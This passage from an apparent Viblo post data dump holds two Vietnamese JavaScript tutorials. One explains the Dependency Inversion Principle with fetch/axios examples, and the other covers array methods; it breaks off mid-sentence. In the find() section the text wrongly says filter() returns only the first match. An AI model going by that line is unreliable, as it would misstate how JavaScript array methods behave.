        "Hi m\u1ecdi ng\u01b0\u1eddi, trong c\u00e1c b\u00e0i vi\u1ebft tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 t\u00ecm hi\u1ec3u v\u1ec1 4 nguy\u00ean l\u00fd \u0111\u1ea7u ti\u00ean c\u1ee7a SOLID, trong b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta c\u00f9ng t\u00ecm hi\u1ec3u v\u1ec1 ch\u1eef c\u00e1i cu\u1ed1i c\u00f9ng nh\u00e9\n# 1. D - Dependency Inversion Principle\n\nNguy\u00ean t\u1eafc Dependency Inversion (vi\u1ebft t\u1eaft l\u00e0 DIP) \u0111\u1ec1 c\u1eadp \u0111\u1ebfn vi\u1ec7c t\u00e1ch r\u1eddi c\u00e1c module. Khi tu\u00e2n theo nguy\u00ean t\u1eafc n\u00e0y, c\u00e1c m\u1ed1i quan h\u1ec7 ph\u1ee5 thu\u1ed9c th\u00f4ng th\u01b0\u1eddng \u0111\u01b0\u1ee3c thi\u1ebft l\u1eadp t\u1eeb c\u00e1c module c\u1ea5p cao \u0111\u1ebfn c\u00e1c module c\u1ea5p th\u1ea5p s\u1ebd b\u1ecb \u0111\u1ea3o ng\u01b0\u1ee3c. V\u1eady \u0111\u1ea3o ng\u01b0\u1ee3c l\u00e0 nh\u01b0 th\u1ebf n\u00e0o nh\u1ec9? C\u00f9ng t\u00ecm hi\u1ec3u kh\u00e1i ni\u1ec7m tr\u01b0\u1edbc \u0111\u00e3 nh\u00e9\n\nN\u1ed9i dung c\u1ee7a nguy\u00ean t\u1eafc n\u00e0y l\u00e0\n\n- C\u00e1c module c\u1ea5p cao kh\u00f4ng n\u00ean ph\u1ee5 thu\u1ed9c v\u00e0o c\u00e1c module c\u1ea5p th\u1ea5p. C\u1ea3 hai \u0111\u1ec1u n\u00ean ph\u1ee5 thu\u1ed9c v\u00e0o  tr\u1eebu t\u01b0\u1ee3ng.\n- Tr\u1eebu t\u01b0\u1ee3ng kh\u00f4ng n\u00ean ph\u1ee5 thu\u1ed9c v\u00e0o chi ti\u1ebft. C\u00e1c chi ti\u1ebft n\u00ean ph\u1ee5 thu\u1ed9c v\u00e0o tr\u1eebu t\u01b0\u1ee3ng.\n\n# 2. DIP trong JavaScript\nCh\u1eafc h\u1eb3n b\u1ea1n \u0111\u00e3 t\u1eebng s\u1eed d\u1ee5ng export v\u00e0 import. N\u00f3 gi\u00fap ch\u00fang ta \u0111\u00f3ng g\u00f3i m\u00e3 v\u00e0 sau \u0111\u00f3 ch\u1ec9 c\u1ea7n import n\u00f3 v\u00e0o n\u01a1i c\u1ea7n s\u1eed d\u1ee5ng. \u0110\u00f3 ch\u00ednh l\u00e0 m\u1ed9t c\u00e1ch tri\u1ec3n khai c\u1ee7a DIP qua c\u00e1c ES6 modules. \n\u0110\u1ec3 t\u00ecm hi\u1ec3u k\u1ef9 s\u00e2u h\u01a1n n\u1eefa th\u00ec h\u00e3y c\u00f9ng \u0111\u1ecdc \u0111o\u1ea1n code d\u01b0\u1edbi \u0111\u00e2y nh\u00e9:\n```js\n// DownloadToConsole.js\nconst url = \"https://jsonplaceholder.typicode.com/posts\"\nclass Example {\n constructor() {\n  ...\n }\n downloadDataFromAPI(params) {\n        \n  //1.\n  fetch(url, {\n   method: 'GET'\n  }).then(r => r.json())\n    .then(r => {\n      console.log(\"Posts:\" + r);\n   });\n }\n}\n```\n\nTrong v\u00ed d\u1ee5 tr\u00ean, ch\u00fang ta c\u00f3 m\u1ed9t class t\u00ean l\u00e0 `DownloadToConsole`.  Trong class n\u00e0y, ch\u00fang ta c\u00f3 method `downloadDataFromAPI`, n\u00f3 s\u1ebd download data t\u1eeb API b\u00ean ngo\u00e0i v\u00e0 sau \u0111\u00f3 in k\u1ebft qu\u1ea3 ra console. Nh\u01b0ng h\u00e3y \u0111\u1ecdc \u0111o\u1ea1n code b\u00ean d\u01b0\u1edbi v\u00e0 xem c\u00f3 v\u1ea5n \u0111\u1ec1 g\u00ec v\u1edbi c\u00e1i tri\u1ec3n khai n\u00e0y? N\u1ebfu thay v\u00ec s\u1eed d\u1ee5ng `Fetch`, ch\u00fang ta mu\u1ed1n s\u1eed d\u1ee5ng c\u00e1ch kh\u00e1c \u0111\u1ec3 l\u1ea5y data nh\u01b0 `Axios` ho\u1eb7c `XMLHttpRequest` th\u00ec sao? \n\nN\u1ebfu ch\u00fang ta \u0111\u00e3 s\u1eed d\u1ee5ng `Fetch` cho t\u1ea5t c\u1ea3 c\u00e1c class c\u1ee7a m\u00ecnh, ch\u00fang ta s\u1ebd ph\u1ea3i thay th\u1ebf n\u00f3 b\u1eb1ng m\u1ed9t tri\u1ec3n khai kh\u00e1c trong t\u1ea5t c\u1ea3 c\u00e1c class kh\u00e1c s\u1eed d\u1ee5ng n\u00f3 v\u00ec ch\u00fang \u0111ang \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng tr\u1ef1c ti\u1ebfp. Vi\u1ec7c n\u00e0y r\u1ea5t t\u1ed1n c\u00f4ng v\u00e0 kh\u00f4ng t\u1ed1t cho vi\u1ec7c b\u1ea3o tr\u00ec code. V\u00ec v\u1eady m\u00e0 DIP n\u00f3i v\u1edbi ch\u00fang ta r\u1eb1ng n\u00ean s\u1eed d\u1ee5ng tr\u1eebu t\u01b0\u1ee3ng (interface), ch\u1ee9 kh\u00f4ng n\u00ean tri\u1ec3n khai c\u1ee5 th\u1ec3.\n\nTrong JavaScript, ch\u00fang ta kh\u00f4ng c\u00f3 interface, nh\u01b0ng ch\u00fang ta c\u00f3 th\u1ec3 c\u00f3 \u0111\u01b0\u1ee3c h\u00e0nh vi t\u01b0\u01a1ng t\u1ef1 b\u1eb1ng c\u00e1ch \u0111\u00f3ng g\u00f3i module: v\u00ed d\u1ee5 nh\u01b0 exporting m\u1ed9t class ho\u1eb7c m\u1ed9t method r\u1ed3i import ch\u00fang nh\u01b0 ph\u1ea7n tr\u00ean m\u00ecnh c\u00f3 \u0111\u1ec1 c\u1eadp \u0111\u1ebfn.\n\nTrong tr\u01b0\u1eddng h\u1ee3p n\u00e0y \u0111\u1ec3 cho c\u00e1ch l\u00e0m \u0111\u01a1n gi\u1ea3n nh\u1ea5t, ch\u00fang ta s\u1ebd export m\u1ed9t ph\u01b0\u01a1ng th\u1ee9c c\u00f3 nhi\u1ec7m v\u1ee5 \u0111\u1ec3 download data. \nB\u00e2y gi\u1edd, t\u1ea1o method `doGet` trong file `utils.js` v\u00e0  s\u1eed d\u1ee5ng `Fetch` \u0111\u1ec3 \u0111\u00f3ng g\u00f3i c\u00e1ch l\u1ea5y data.\n\n```js\n// utils.js\nexport const doGet = (url) => {\n //2.\n return fetch(url, {\n        method: 'GET',\n        mode: 'same-origin',\n        ...\n }).then(r => r.json())\n};\n```\nSau \u0111\u00f3, ch\u00fang ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng import ph\u1ee5 thu\u1ed9c `doGet` v\u00e0 s\u1eed d\u1ee5ng n\u00f3:\n\n```js\n// DownloadToConsole.js\nimport { doGet } from './utils.js'\n\nconst url = \"https://jsonplaceholder.typicode.com/posts\"\nclass Example{\n constructor() {\n  ...\n }\n downloadDataFromAPI(params) {\n       \n  doGet(url)\n   .then(r => {\n    console.log(\"Posts:\" + r);\n   });\n }\n}\n```\nV\u00e0 b\u00e2y gi\u1edd, thay v\u00ec s\u1eed d\u1ee5ng `Fetch`, n\u1ebfu mu\u1ed1n s\u1eed d\u1ee5ng `Axios` hay `XMLHttpRequest`, ch\u00fang ta s\u1ebd ch\u1ec9 c\u1ea7n \u0111\u1ed5i ph\u1ea7n implemention trong `utils.js` sang s\u1eed d\u1ee5ng `Axios` ho\u1eb7c `XMLHttpRequest`, v\u00e0 m\u1ecdi th\u1ee9 v\u1eabn s\u1ebd ho\u1ea1t \u0111\u1ed9ng t\u1ed1t v\u00e0 kh\u00f4ng ph\u1ea3i thay \u0111\u1ed5i g\u00ec th\u00eam n\u1eefa.\n\n```js\n// utils.js\n\nexport const doGet = (url) => {\n  return axios.get(url);\n};\n```\nNh\u01b0 b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y, trong c\u00e1c class m\u00e0 b\u1ea1n import ph\u01b0\u01a1ng th\u1ee9c `doGet`, b\u1ea1n s\u1ebd kh\u00f4ng c\u1ea7n ph\u1ea3i quan t\u00e2m n\u00f3 \u0111\u01b0\u1ee3c tri\u1ec3n khai c\u1ee5 th\u1ec3 nh\u01b0 th\u1ebf n\u00e0o, vi\u1ec7c n\u00e0y cho ph\u00e9p b\u1ea1n t\u00e1ch \u0111o\u1ea1n code x\u1eed l\u00fd download ra kh\u1ecfi module ch\u00ednh. \u0110\u1ed3ng th\u1eddi c\u00e1ch \u0111\u00f3ng g\u00f3i code nh\u01b0 v\u1eady c\u0169ng gi\u00fap code s\u1ebd kh\u00f4ng b\u1ecb l\u1eb7p l\u1ea1i, d\u1ec5 d\u00e0ng maintain.\n\nB\u00e0i vi\u1ebft \u0111\u1ebfn \u0111\u00e2y l\u00e0 h\u1ebft. Hi v\u1ecdng \u0111\u00e3 gi\u00fap c\u00e1c b\u1ea1n hi\u1ec3u \u0111\u01b0\u1ee3c ph\u1ea7n n\u00e0o v\u1ec1 nguy\u00ean t\u1eafc cu\u1ed1i c\u00f9ng trong SOLID v\u00e0 \u00e1p d\u1ee5ng \u0111\u01b0\u1ee3c n\u00f3 trong c\u00e1c d\u1ef1 \u00e1n th\u1ef1c t\u1ebf.\nC\u1ea3m \u01a1n c\u00e1c b\u1ea1n \u0111\u00e3 theo d\u00f5i b\u00e0i vi\u1ebft.\n\nTham kh\u1ea3o: [Link](https://medium0.com/m/global-identity?redirectUrl=https%3A%2F%2Fjavascript.plainenglish.io%2Fdecoupling-code-in-javascript-with-the-dependency-inversion-principle-6d23342b4aaa)",
      published_at: "2021-03-18 22:08:01",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 4,
      views_count: 59,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 26381,
          url: "https://viblo.asia/u/trang2uet",
          avatar: "a2b7ec90-56bf-41fd-9e41-d03d12ca77bb.png",
          name: "Trang Nguyen",
          username: "trang2uet",
          followers_count: 27,
          reputation: 889,
          posts_count: 25,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "solid",
            name: "SOLID",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=SOLID&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51451,
      title:
        "M\u1ed9t s\u1ed1 Array Method trong JavaScrip h\u1eefu \u00edch cho b\u1ea1n",
      slug: "3P0lP1045ox",
      url:
        "https://viblo.asia/p/mot-so-array-method-trong-javascrip-huu-ich-cho-ban-3P0lP1045ox",
      user_id: 29188,
      moderation: null,
      transliterated: "mot-so-array-method-trong-javascrip-huu-ich-cho-ban",
      contents_short:
        "L\u1eddi m\u1edd \u0111\u1ea7u\nJavaScript cung c\u1ea5p cho ch\u00fang ta r\u1ea5t nhi\u1ec1u c\u00e1c ph\u01b0\u01a1ng ph\u00e1p kh\u00e1c nhau \u0111\u1ec3 x\u1eed l\u00fd c\u00e1c m\u1ea3ng. H\u00f4m nay, t\u00f4i s\u1ebd \u0111i\u1ec3m qua m\u1ed9t s\u1ed1 c\u00e1ch c\u1ea7n thi\u1ebft \u0111\u1ec3 b\u1ea1n c\u1ea3i thi\u1ec7n k\u1ef9 n\u0103ng ph\u00e1t tri\u1ec3n JavaScript c\u1ee7a ...",
      contents:
        '### L\u1eddi m\u1edd \u0111\u1ea7u\n**JavaScript** cung c\u1ea5p cho ch\u00fang ta r\u1ea5t nhi\u1ec1u c\u00e1c ph\u01b0\u01a1ng ph\u00e1p kh\u00e1c nhau \u0111\u1ec3 x\u1eed l\u00fd c\u00e1c m\u1ea3ng. H\u00f4m nay, t\u00f4i s\u1ebd \u0111i\u1ec3m qua m\u1ed9t s\u1ed1 c\u00e1ch c\u1ea7n thi\u1ebft \u0111\u1ec3 b\u1ea1n c\u1ea3i thi\u1ec7n k\u1ef9 n\u0103ng ph\u00e1t tri\u1ec3n **JavaScript** c\u1ee7a m\u00ecnh ch\u1ec9 trong v\u00e0i ph\u00fat.\n\n### 1. Array.map ()\n\nB\u1ea5t c\u1ee9 khi n\u00e0o b\u1ea1n s\u1eed d\u1ee5ng method `.map()` v\u1edbi m\u1ed9t m\u1ea3ng, n\u00f3 s\u1ebd t\u1ea1o ra m\u1ed9t m\u1ea3ng m\u1edbi, \u0111\u01b0\u1ee3c s\u1eeda \u0111\u1ed5i t\u1eeb m\u1ea3ng ban \u0111\u1ea7u. Method `map()` cho ph\u00e9p b\u1ea1n duy\u1ec7t qua t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng v\u00e0 thay \u0111\u1ed5i ch\u00fang.\n\nMethod `map()` s\u1ebd c\u00f3 \u00edch khi b\u1ea1n mu\u1ed1n update t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed trong m\u1ea3ng v\u00e0 l\u01b0u n\u00f3 l\u1ea1i.\n\nGi\u1ea3 s\u1eed ch\u00fang ta c\u00f3 m\u1ed9t m\u1ea3ng bao g\u1ed3m t\u00ean c\u1ee7a c\u00e1c th\u01b0\u01a1ng hi\u1ec7u \u00f4 t\u00f4 :\n```js\nconst cars = ["Porsche", "Audi", "BMW", "Volkswagen"];\n```\n\nV\u00e0 n\u1ebfu c\u00e1c b\u1ea1n mu\u1ed1n th\u00eam m\u1ed9t \u0111i\u1ec1u g\u00ec \u0111\u00f3 cho t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng tr\u00ean th\u00ec ch\u00fang ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng method `map()` .\n\n```js\nconst coolCars = cars.map(car => `${car} is a pretty cool car brand!`);\n```\n\nV\u00e0 k\u1ebft qu\u00e0 l\u00e0 m\u1ea3ng m\u1edbi `coolCars`, s\u1ebd tr\u1ea3 v\u1ec1 k\u1ebft qu\u1ea3 nh\u01b0 th\u1ebf n\u00e0y.\n```js\n["Porsche is a pretty cool car brand!", "Audi is a pretty cool car brand!", "BMW is a pretty cool car brand!", "Volkswagen is a pretty cool car brand!"];\n```\n\nNh\u01b0 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y, t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed trong m\u1ea3ng m\u1edbi \u0111\u00e3 \u0111\u01b0\u1ee3c th\u00eam n\u1ed9i dung m\u00e0 ch\u00fang ta mu\u1ed1n thay \u0111\u1ed5i.\n\nM\u1ed9t \u0111i\u1ec1u th\u00fa v\u1ecb kh\u00e1c m\u00e0 c\u00e1c b\u1ea1n c\u0169ng n\u00ean bi\u1ebft l\u00e0 c\u00e1ch x\u1eed l\u00fd c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng v\u1edbi method `map()` trong m\u1ea3ng: \n\nB\u00e2y gi\u1edd ch\u00fang ta s\u1ebd t\u1ea1o ra m\u1ed9t m\u1ea3ng c\u00e1c bao g\u1ed3m c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng l\u00e0 c\u00e1c h\u00e3ng xe v\u00e0 gi\u00e1 c\u1ee7a n\u00f3:\n\n```js \nconst carsWithPrice = [\n  {brand: "Porsche", price: 100000},\n  {brand: "Audi", price: 80000}\n];\n```\n\nN\u1ebfu ta mu\u1ed1n th\u00eam gi\u00e1 thu\u1ebf c\u1ee7a c\u00e1c h\u00e3ng xe n\u00e0y ta c\u0169ng c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng method `map()`\n\n```js\nconst carsWithPriceAndTax = carsWithPrice.map(carObject => {\n  return {\n    // Return the original car object\n    ...carObject,\n    // but also add a new value containing the price with tax\n    priceWithTax: carObject.price * 1.2\n  }\n});\n```\n\nV\u00e0 \u0111\u00e2y l\u00e0 k\u1ebft qu\u1ea3:\n\n```\n[\n  {brand: "Porsche", price: 100000, priceWithTax: 120000},\n  {brand: "Audi", price: 80000, priceWithTax: 96000}\n];\n```\nNh\u01b0 c\u00e1c b\u1ea1n th\u1ea5y th\u00ec ta \u0111\u00e3 th\u00eam \u0111\u01b0\u1ee3c `priceWithTax` v\u00e0o c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng c\u1ee7a m\u1ea3ng b\u1ea3n \u0111\u1ea7u. \n\nN\u00f3i chung, method `map()` cho ph\u00e9p ta thay \u0111\u1ed5i n\u1ed9i dung c\u1ee7a m\u1ed9t m\u1ea3ng \u0111\u00e3 t\u1ed3n t\u1ea1i v\u00e0 l\u01b0u n\u00f3 v\u00e0o bi\u1ebfn m\u1edbi m\u1ed9t c\u00e1ch linh ho\u1ea1t.\n\n\n### 2. Array.filter()\n\nD\u1ef1a v\u00e0o t\u00ean method, c\u00e1c b\u1ea1n ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 \u0111o\u00e1n \u0111\u01b0\u1ee3c nh\u1eefng g\u00ec m\u00e0 method `filter()` s\u1ebd th\u1ef1c hi\u1ec7n \u0111\u00fang kh\u00f4ng ?\n\nMethod `filter()` cho ph\u00e9p b\u1ea1n l\u1ea5y ra c\u00e1c ph\u1ea7n t\u1eed t\u1eeb m\u1ea3ng ban \u0111\u1ea7u v\u1edbi c\u00e1c \u0111i\u1ec1u ki\u1ec7n b\u1ea1n mong mu\u1ed1n.\n\nC\u0169ng gi\u1ed1ng nh\u01b0 method `map()`, method `filter()` s\u1ebd tr\u1ea3 v\u1ec1 m\u1ed9t m\u1ea3ng m\u1edbi v\u00e0 kh\u00f4ng l\u00e0m thay \u0111\u1ed5i m\u1ea3ng ban \u0111\u1ea7u.\n\nV\u00ed d\u1ee5: ti\u1ebfp t\u1ee5c m\u1ed9t v\u00ed d\u1ee5 v\u1ec1 \u00f4 t\u00f4, t\u00f4i s\u1ebd ti\u1ebfn h\u00e0nh l\u1ecdc m\u1ea3ng d\u1ef1a v\u00e0 c\u00e1c \u0111i\u1ec1u ki\u1ec7n v\u1ec1 gi\u00e1.\n\n\u0110\u00e2y l\u00e0 m\u1ea3ng ban \u0111\u1ea7u c\u1ee7a t\u00f4i :\n\n```js\nconst cars = [\n  {brand: "Porsche", price: 100000},\n  {brand: "Audi", price: 80000},\n  {brand: "Toyota", price: 30000}\n];\n```\n\nB\u00e2y gi\u1edd t\u00f4i  s\u1ebd s\u1eed d\u1ee5ng method `filter()` \u0111\u1ec3 l\u1ea5y ra c\u00e1c lo\u1ea1i xe v\u1edbi c\u00e1c \u0111i\u1ec1u ki\u1ec7n v\u1ec1 gi\u00e1 m\u00e0 t\u00f4i mong mu\u1ed1n\n\n```js\nconst expensiveCars = cars.filter(car => car.price >= 40000);\nconst cheapCars = cars.filter(car => car.price < 40000);\n\n// k\u1ebft qu\u1ea3 cho c\u00e1c xe c\u00f3 gi\u00e1 >=40000\n[\n  {brand: "Porsche", price: 100000},\n  {brand: "Audi", price: 80000}\n];\n// k\u1ebft qu\u1ea3 cho c\u00e1c xe c\u00f3 gi\u00e1 <40000\n[\n  {brand: "Toyota", price: 30000}\n];\n```\n\nM\u1ed7i ph\u1ea7n t\u1eed trong m\u1ea3ng s\u1ebd \u0111\u01b0\u1ee3c so s\u00e1nh v\u1edbi \u0111i\u1ec1u ki\u1ec7n cho tr\u01b0\u1edbc, n\u1ebfu n\u00f3 th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n th\u00ec n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c l\u01b0u trong m\u1ed9t m\u1ea3ng m\u1edbi.\n\n### 3.Array.forEach()\nM\u1ed9t method c\u01a1 b\u1ea3n \u0111\u00fang kh\u00f4ng?\n\nMethod `forEach()` \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng r\u1ea5t nhi\u1ec1u, n\u00f3 t\u01b0\u01a1ng t\u1ef1 nh\u01b0 v\u00f2ng l\u1eb7p `for`\n\nN\u00f3 l\u1eb7p l\u1ea1i tr\u00ean m\u1ed9t m\u1ea3ng v\u00e0 th\u1ef1c thi m\u1ed9t ch\u1ee9c n\u0103ng tr\u00ean m\u1ed7i ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng \u0111\u00f3. Tham s\u1ed1 \u0111\u1ea7u ti\u00ean c\u1ee7a method  n\u00e0y l\u00e0 m\u1ed9t callback function bao g\u1ed3m value hi\u1ec7n t\u1ea1i v\u00e0 index c\u1ee7a v\u00f2ng l\u1eb7p\n\nV\u00ed d\u1ee5 t\u00f4i c\u00f3 m\u1ed9t m\u1ea3ng g\u1ed3m c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng nh\u01b0 sau:\n\n```js\nconst cars = [\n  {brand: "Porsche", price: 100000},\n  {brand: "Audi", price: 80000},\n  {brand: "Toyota", price: 30000}\n];\n```\nT\u00f4i c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng `forEach()` duy\u1ec7t qua t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng tr\u00ean v\u00e0 l\u1ea5y ra c\u00e1c thu\u1ed9c t\u00ednh mong mu\u1ed1n \u0111\u1ec3 ho\u00e0n th\u00e0nh m\u1ed9t c\u00e2u :\n\n```js\ncars.forEach(car => {\n  console.log(`The ${car.brand} will cost you ${car.price} before taxes`);\n});\n```\nK\u1ebft qu\u1ea3: \n```\n"The Porsche will cost you 100000 before taxes"\n"The Audi will cost you 80000 before taxes"\n"The Toyota will cost you 30000 before taxes"\n```\n Khi n\u00e0o s\u1eed d\u1ee5ng  **Array.forEach()**?\n \nKhi b\u1ea1n ch\u1ec9 mu\u1ed1n l\u1eb7p l\u1ea1i t\u1eebng m\u1ee5c c\u1ee7a b\u1ea5t k\u1ef3 m\u1ea3ng n\u00e0o m\u00e0 kh\u00f4ng c\u1ea7n x\u00e2y d\u1ef1ng m\u1ed9t m\u1ea3ng m\u1edbi.\n \n\n### 4. Array.find ()\nMethod `find()` n\u00e0y c\u00f3 v\u1ebb gi\u1ed1ng v\u1edbi method `filter()` m\u00e0 t\u00f4i \u0111\u00e3 gi\u1edbi thi\u1ec7u v\u1edbi c\u00e1c b\u1ea1n.\n\n\u0110\u00fang v\u1eady, c\u0169ng gi\u1ed1ng nh\u01b0 method `.filter()` b\u1ea1n c\u00f3 th\u1ec3 chuy\u1ec3n m\u1ed9t \u0111i\u1ec1u ki\u1ec7n m\u00e0 gi\u00e1 tr\u1ecb ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng ph\u1ea3i th\u1ecfa m\u00e3n, nh\u01b0ng n\u00f3 c\u00f3 s\u1ef1 kh\u00e1c bi\u1ec7t \u0111\u00f3 l\u00e0 method `.filter()` ch\u1ec9 tr\u1ea3 v\u1ec1 ph\u1ea7n t\u1eed \u0111\u1ea7u ti\u00ean ph\u00f9 h\u1ee3p v\u1edbi \u0111i\u1ec1u ki\u1ec7n m\u00e0 b\u1ea1n \u0111\u01b0a ra.\n\nTi\u1ebfp t\u1ee5c v\u1edbi v\u00ed d\u1ee5 v\u1ec1 \u00f4 t\u00f4 ph\u00eda tr\u00ean v\u1edbi method `.filter()` nh\u00e9.\n\n```js\nconst cars = [\n  {brand: "Porsche", price: 100000},\n  {brand: "Audi", price: 80000},\n  {brand: "Toyota", price: 30000}\n];\n\nconst expensiveCar = cars.find(car => car.price >= 40000);\n```\n\nK\u1ebft qu\u1ea3 l\u00e0 :\n\n```\n{brand: "Porsche", price: 100000}\n```\n\nNh\u01b0 c\u00e1c b\u1ea1n th\u1ea5y th\u00ec ch\u1ec9 c\u00f3 duy nh\u1ea5t ph\u1ea7n t\u1eed \u0111\u1ea7u ti\u00ean c\u1ee7a m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n \u0111\u01b0\u1ee3c l\u1ecdc ra.\n\n### 5.Array.every()\n\nMethod `every()` s\u1ebd ki\u1ec3m tr\u1ea3 xem t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u01b0 trong m\u1ea3ng c\u00f3 th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n cho tr\u01b0\u1edbc hay kh\u00f4ng ?\n\nN\u1ebfu t\u1ea5t c\u1ea3 ph\u1ea9n t\u1eed trong m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n cho tr\u01b0\u1edbc th\u00ec method s\u1ebd tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb `true`, v\u00e0 ng\u01b0\u1ee3c l\u1ea1i l\u00e0 `false`.\n\nV\u00ed d\u1ee5, t\u00f4i s\u1ebd check \u0111i\u1ec1u ki\u1ec7n  xem t\u1ea5t c\u1ea3 c\u00e1c \u00f4 t\u00f4 c\u00f3 \u0111\u01b0\u1ee3c s\u1ea3n xu\u1ea5t trong v\u00f2ng 5 n\u0103m hay kh\u00f4ng ?\n```js\nconst cars = [\n  {brand: "Porsche", price: 100000, builtIn: 2018},\n  {brand: "Audi", price: 80000, builtIn: 2019},\n  {brand: "Toyota", price: 30000, builtIn: 2019}\n];\n\nconst carsYoungerThanFiveYears = cars.every(car => car.builtIn >= 2016);\n\n//K\u1ebft qu\u1ea3 tr\u1ea3 v\u1ec1 l\u00e0\ntrue\n```\n\nKhi n\u00e0o th\u00ec d\u00f9ng Array.every()\n\nKhi b\u1ea1n mu\u1ed1n x\u00e1c minh r\u1eb1ng t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng \u0111\u1ec1u th\u1ecfa m\u00e3n m\u1ed9t \u0111i\u1ec1u ki\u1ec7n \u0111\u00e3 \u0111\u01b0\u1ee3c \u0111\u1ecbnh ngh\u0129a t\u1eeb tr\u01b0\u1edbc.\n\n\n### 6 Array.some()\nMethod `some()` c\u0169ng t\u01b0\u01a1ng t\u1ef1 nh\u01b0 method `every()`, nh\u01b0ng thay v\u00ec tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb true khi t\u1ea5t c\u1ea3 c\u00e1c ph\u1ea7n t\u1eeb trong m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n cho tr\u01b0\u1edbc, n\u00f3 s\u1ebb tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb true n\u1ebfu \u00edt nh\u1ea5t m\u1ed9t ph\u1ea7n t\u1eed c\u1ee7a m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n cho tr\u01b0\u1edbc.\n\nN\u1ebfu method `some()` t\u00ecm th\u1ea5y m\u1ed9t ph\u1ea7n t\u1eed trong m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n th\u00ec n\u00f3 s\u1ebd tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb true, v\u00e0 n\u1ebfu kh\u00f4ng t\u00ecm th\u1ea5y ph\u1ea7n t\u1eed n\u00e0o trong m\u1ea3ng th\u1ecfa m\u00e3n \u0111i\u1ec1u ki\u1ec7n th\u00ec n\u00f3 s\u1ebd tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb false.\n\nTi\u00ea\u0301p tu\u0323c v\u01a1\u0301i vi\u0301 du\u0323 \u01a1\u0309 tr\u00ean nhe\u0301, nh\u01b0ng l\u00e2\u0300n na\u0300y v\u01a1\u0301i method `some()` chu\u0301ng ta se\u0303 ki\u00ea\u0309m tra xem co\u0301 xe na\u0300o \u0111a\u0303 sa\u0309n xu\u00e2\u0301t h\u01a1n 5 n\u0103m kh\u00f4ng nhe\u0301.\n\n```js \nconst cars = [\n  {brand: "Porsche", price: 100000, builtIn: 2018},\n  {brand: "Audi", price: 80000, builtIn: 2019},\n  {brand: "Toyota", price: 30000, builtIn: 2019}\n];\nconst carsOlderThanFiveYears = cars.some(car => car.builtIn < 2016);\n```\n\nVa\u0300 k\u00ea\u0301t qua\u0309 la\u0300 \n```\nfalse\n```\nV\u00e2\u0323y thi\u0300 chu\u0301ng ta se\u0303 s\u01b0\u0309 du\u0323ng `some()` khi na\u0300o ?\n\nKhi ba\u0323n mu\u00f4\u0301n ki\u00ea\u0309m tra xem trong ma\u0309ng co\u0301 i\u0301t nh\u00e2\u0301t 1 ph\u00e2\u0300n t\u01b0\u0309 tho\u0309a ma\u0303n \u0111i\u00ea\u0300u ki\u00ea\u0323n cho tr\u01b0\u01a1\u0301c.\n\n### K\u00ea\u0301t lu\u00e2\u0323n\nNh\u01b0 ca\u0301c ba\u0323n co\u0301 th\u00ea\u0309 th\u00e2\u0301y, JavaScript cung c\u00e2\u0301p cho chu\u0301ng ta \u00e2\u0301t nhi\u00ea\u0300u method kha\u0301c nhau \u0111\u00ea\u0309 x\u01b0\u0309 ly\u0301 ma\u0309ng. S\u01b0\u0309 du\u0323ng ca\u0301c method na\u0300y ba\u0323n se\u0303 co\u0301 th\u00ea\u0309 d\u00ea\u0303 da\u0300ng thao ta\u0301c, x\u01b0\u0309 ly\u0301 ma\u0309ng trong ca\u0301c tr\u01b0\u01a1\u0300ng h\u01a1\u0323p 